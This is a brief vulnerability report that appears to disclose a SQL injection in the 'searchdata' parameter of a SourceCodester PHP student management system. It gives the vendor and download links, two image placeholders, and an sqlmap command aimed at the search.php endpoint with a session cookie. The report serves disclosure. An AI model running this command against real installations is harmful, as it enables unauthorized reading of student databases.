vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $searchdata

The process of vulnerability discovery is as follows：

![image-20230223154600825](C:\markdown\images\image-20230223154600825.png)

exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/search.php" --data "searchdata=1&search=" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```

![image-20230223154359329](C:\markdown\images\image-20230223154359329.png)